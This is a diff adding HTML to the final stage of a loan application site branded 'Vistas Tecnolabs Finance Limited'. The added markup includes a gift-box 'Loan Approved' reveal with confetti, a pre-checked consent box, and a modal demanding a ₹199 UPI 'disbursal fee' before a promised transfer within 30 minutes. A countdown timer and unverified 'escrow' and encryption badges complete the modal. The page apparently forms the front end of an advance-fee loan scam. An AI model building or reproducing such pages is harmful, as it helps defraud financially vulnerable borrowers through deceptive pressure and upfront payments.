+                ⚡ <strong>Disbursal Stage Guarantee:</strong> Jaise hi borrower yeh ₹<span id="feeNoticeSpan">199</span> fee pay karega, loan turant <strong>Disbursal Stage</strong> par aa jayega aur hamara banking staff <strong>30 minute ke andar</strong> loan amount aapke bank account me transfer kar dega.
+              </div>
+            </div>
+
+            <!-- Transparent Repayment Notice -->
+            <div class="transparent-repay-notice">
+              <span class="notice-icon">💡</span>
+              <span id="repaymentFormulaText">Principal + Interest = Total Repayment Amount</span>
+            </div>
+
+            <!-- Sanction Agreement Checklist -->
+            <div class="sanction-terms-box">
+              <label class="terms-label">
+                <input type="checkbox" id="sanctionConsent" checked>
+                <span>I accept the loan sanction letter and repayment schedule issued by <strong>Vistas Tecnolabs Finance Limited</strong> and authorize immediate fund transfer upon fee verification.</span>
+              </label>
+            </div>
+
+            <!-- Disburse Button: Opens Fee Modal -->
+            <button type="button" class="btn btn-success btn-block btn-lg" id="acceptLoanBtn" onclick="openDisbursalFeeModal()">
+              ⚡ Pay ₹199 Fee & Disburse Loan (In 30 Mins) →
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Declined Sanction Card -->
+      <div id="creditDeclineCard" style="display: none; margin-top: 24px;">
+        <div class="decline-card">
+          <div class="decline-icon">⚠️</div>
+          <h3>Credit Application Not Approved</h3>
+          <p id="declineReasonText">As per Vistas Tecnolabs Finance Limited underwriting policy, minimum monthly income must be at least ₹15,000.</p>
+          <div class="decline-advice">
+            <strong>💡 Policy Guidelines by Vistas Tecnolabs Finance Limited:</strong>
+            <ul>
+              <li>Minimum monthly salary requirement: ₹15,000</li>
+              <li>Age must be between 18 and 58 years</li>
+              <li>Bank account must be active and in applicant's name</li>
+            </ul>
+          </div>
+          <button type="button" class="btn btn-secondary btn-block" onclick="prevStep()">← Review Previous Details</button>
+        </div>
+      </div>
+
+    </div>
+
+  </div>
+
+  <!-- Bottom Navigation -->
+  <div class="bottom-nav" id="bottomNav">
+    <button class="btn btn-secondary" id="prevBtn" onclick="prevStep()" style="display: none;">
+      ← Previous
+    </button>
+    <button class="btn btn-primary" id="nextBtn" onclick="nextStep()">
+      Next Step →
+    </button>
+    <button class="btn btn-success" id="submitBtn" onclick="submitApplication()" style="display: none;">
+      Submit Application ✓
+    </button>
+  </div>
+
+  <!-- Disbursal Fee Payment Modal -->
+  <div class="modal-overlay" id="disbursalFeeModal">
+    <div class="modal-content" style="max-width: 440px; text-align: center;">
+      <button type="button" class="modal-close" onclick="closeDisbursalFeeModal()" aria-label="Close" style="position: absolute; right: 16px; top: 16px; background: none; border: none; font-size: 20px; cursor: pointer;">✕</button>
+      <div class="modal-icon" style="font-size: 38px; margin-bottom: 8px;">🏛️</div>
+      <div class="badge badge-primary" style="margin-bottom: 8px; font-size: 11px;">Vistas Tecnolabs Finance Limited</div>
+      <h3 style="font-size: 20px; font-weight: 800; color: var(--dark); margin-bottom: 6px;">Pay Loan Disbursal Fee</h3>
+      <p style="font-size: 13px; color: var(--gray-700); line-height: 1.5; margin-bottom: 16px;">
+        Fee pay hote hi loan turant <strong>Disbursal Stage</strong> par aa jayega aur hamara staff 30 minute ke andar paise transfer kar dega.
+      </p>
+
+      <!-- Amount breakdown -->
+      <div style="background: rgba(26, 31, 113, 0.05); border: 2px dashed var(--primary); border-radius: var(--radius-md); padding: 14px; margin-bottom: 16px; text-align: left;">
+        <div style="display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 6px;">
+          <span style="color: var(--gray-700);">Sanctioned Loan:</span>
+          <strong id="feeModalLoanAmount" style="color: var(--dark);">₹16,420</strong>
+        </div>
+        <div style="display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 6px;">
+          <span style="color: var(--gray-700);">Disbursal Account:</span>
+          <strong id="feeModalBank" style="color: var(--dark);">SBI ••••4567</strong>
+        </div>
+        <div style="display: flex; justify-content: space-between; font-size: 15px; font-weight: 800; padding-top: 8px; border-top: 1px solid rgba(0,0,0,0.1);">
+          <span style="color: var(--primary);">One-Time Disbursal Fee:</span>
+          <span id="feeModalPayAmount" style="color: var(--secondary); font-size: 20px;">₹199</span>
+        </div>
+      </div>
+
+      <!-- Payment Method Selection -->
+      <div style="text-align: left; margin-bottom: 16px;">
+        <label style="font-size: 12px; font-weight: 700; color: var(--dark); margin-bottom: 8px; display: block;">Select Payment Method:</label>
+        <div class="payment-methods-grid" style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px;">
+          <div class="payment-method-card selected" onclick="selectFeePayMethod(this)">
+            <span>⚡ Google Pay</span>
+          </div>
+          <div class="payment-method-card" onclick="selectFeePayMethod(this)">
+            <span>🟣 PhonePe</span>
+          </div>
+          <div class="payment-method-card" onclick="selectFeePayMethod(this)">
+            <span>🔵 Paytm UPI</span>
+          </div>
+          <div class="payment-method-card" onclick="selectFeePayMethod(this)">
+            <span>🏦 Net Banking</span>
+          </div>
+        </div>
+      </div>
+
+      <button type="button" class="btn btn-success btn-block btn-lg" id="confirmFeePayBtn" onclick="processDisbursalFeePayment()">
+        Confirm & Pay ₹199 via UPI →
+      </button>
+
+      <div style="margin-top: 12px; font-size: 11px; color: var(--gray-500); display: flex; align-items: center; justify-content: center; gap: 4px;">
+        <span>🔒 256-Bit Encrypted | Vistas Tecnolabs Finance Limited Escrow Desk</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Disbursal Success Modal -->
+  <div class="modal-overlay" id="successModal">
+    <div class="modal-content" style="max-width: 440px; text-align: center;">
+      <div class="modal-icon">🚀</div>
+      <div class="badge badge-success" style="margin-bottom: 10px; font-size: 11px;">🏛️ Vistas Tecnolabs Finance Limited</div>
+      <h3 style="font-size: 20px; font-weight: 800; color: var(--dark); margin-bottom: 8px;">Loan Disbursal Stage Active!</h3>
+      <p style="font-size: 14px; color: var(--gray-700); line-height: 1.6; margin-bottom: 16px;">
+        🎉 Fee Paid Successfully! Aapka personal loan of <strong id="modalApprovedAmount" style="color: var(--primary); font-size: 16px;">₹16,420</strong> <strong>Disbursal Stage</strong> par pahunch gaya hai.
+      </p>
+
+      <div style="background: rgba(0, 184, 148, 0.08); border: 1px solid rgba(0, 184, 148, 0.3); border-radius: var(--radius-md); padding: 14px; margin-bottom: 18px; text-align: left;">
+        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 6px;">
+          <span style="font-size: 18px;">⏳</span>
+          <strong style="font-size: 13px; color: var(--dark);">30-Minute Staff Disbursal Window:</strong>
+        </div>
+        <p style="font-size: 12px; color: var(--gray-700); margin: 0; line-height: 1.5;">
+          Hamara banking verification staff agle <strong>30 minute ke andar</strong> loan amount aapke bank account (<span id="modalSuccessBankName">SBI</span>) me transfer kar dega.
+        </p>
+        <div style="margin-top: 10px; font-size: 13px; font-weight: 700; color: var(--primary); display: flex; justify-content: space-between; align-items: center; padding-top: 8px; border-top: 1px dashed rgba(0, 184, 148, 0.3);">
+          <span>Estimated Transfer Time:</span>
+          <span id="modalCountdownTimer" style="background: var(--primary); color: white; padding: 2px 8px; border-radius: 4px; font-family: monospace;">29:59 Mins</span>
+        </div>
+      </div>
+
+      <div class="app-ref" id="appRefNumber">VT-AL-XXXXXX</div>
+      <p style="font-size: 11px; color: var(--gray-500); margin-bottom: 18px;">Sanction & IMPS Dispatch Reference ID</p>
+      <a href="dashboard.html" class="btn btn-primary btn-block btn-lg">Go to Dashboard & Track Live Transfer →</a>
+    </div>
+  </div>
+
+  <!-- ==================== GIFT BOX REVEAL CELEBRATION MODAL ==================== -->
+  <div class="modal-overlay gift-modal-overlay" id="giftRevealModal">
+    <canvas id="confettiCanvas" class="confetti-canvas"></canvas>
+    
+    <div class="gift-modal-content">
+      
+      <!-- Stage 1: Closed Gift Box with Wiggle Animation -->
+      <div id="giftStageClosed" class="gift-stage-box" onclick="openGiftBox()">
+        <div class="gift-sparkles-floating">✨ 🌟 ✨</div>
+        <div class="gift-3d-box animate-gift-wiggle">
+          <div class="gift-lid" id="giftLid">
+            <div class="gift-bow">🎀</div>
+          </div>
+          <div class="gift-box-base">
+            <div class="gift-ribbon-vertical"></div>
+            <div class="gift-ribbon-horizontal"></div>
+            <span class="gift-emblem">🏛️</span>
+          </div>
+        </div>
+        <h3 class="gift-tap-title">🎁 Tap to Unwrap Your Loan Gift!</h3>
+        <p class="gift-tap-sub">Vistas Tecnolabs Finance Limited has unlocked a special credit offer for you</p>
+        <button type="button" class="btn btn-warning btn-lg gift-open-btn" onclick="openGiftBox()">
+          ✨ Tap to Open Gift ✨
+        </button>
+      </div>
+
+      <!-- Stage 2: Revealed Loan Sanction (Pops up with golden aura & confetti) -->
+      <div id="giftStageOpen" class="gift-revealed-box" style="display: none;">
+        <div class="gift-gold-rays"></div>
+        <div class="gift-badge-trophy animate-trophy-pop">🏆</div>
+        <div class="gift-congrats-tag">🎉 CONGRATULATIONS! 🎉</div>
+        <h2 class="gift-loan-approved-title">Personal Loan Approved</h2>
+        <div class="gift-lender-credit">Official Lender: <strong>Vistas Tecnolabs Finance Limited</strong></div>
+
+        <div class="gift-amount-reveal animate-amount-zoom">
+          <span class="currency-symbol">₹</span>
+          <span id="giftAmountNum">16,420</span>
+        </div>
+
+        <div class="gift-benefits-row">
+          <span class="benefit-tag">⚡ Instant Transfer</span>
+          <span class="benefit-tag">📅 Up to 12M Tenure</span>
+          <span class="benefit-tag">0 Collateral</span>
+        </div>
+
+        <div class="gift-unlock-note">
+          💡 Aapka personal loan gift safaltapoorvak unlock ho gaya hai! Neeche apna tenure select karein aur disbursal finalize karein.
+        </div>
+
+        <button type="button" class="btn btn-success btn-block btn-lg gift-claim-btn" onclick="claimGiftAndShowOffer()">
+          🚀 Claim Loan & Select Tenure →
+        </button>
+      </div>
+
+    </div>
+  </div>
+
+  <script src="js/config.js"></script>
+  <script src="js/api.js"></script>
+  <script src="js/apply.js"></script>
+  <script src="js/kyc.js"></script>
+</body>
+</html>
